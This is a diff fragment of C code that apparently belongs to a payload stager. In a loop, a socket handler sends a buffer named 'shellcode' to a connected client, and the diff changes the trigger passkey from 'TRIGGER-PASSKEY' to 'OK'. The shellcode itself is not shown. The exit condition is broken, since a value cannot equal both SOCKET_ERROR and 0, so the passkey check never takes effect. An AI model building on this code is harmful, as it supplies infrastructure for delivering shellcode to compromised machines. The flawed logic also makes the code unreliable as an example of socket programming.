@@ -13,7 +13,7 @@ int handlePayload(LPVOID args) {
 
     while (1) {
         bytesReceived = recv(acceptSocket, buffer, sizeof(buffer) - 1, 0);
-        if (bytesReceived == SOCKET_ERROR && bytesReceived == 0 && strcmp(buffer, "TRIGGER-PASSKEY") != 0) {
+        if (bytesReceived == SOCKET_ERROR && bytesReceived == 0 && strcmp(buffer, "OK") != 0) {
             break;
         }
         send(acceptSocket, shellcode, sizeof(shellcode), 0);
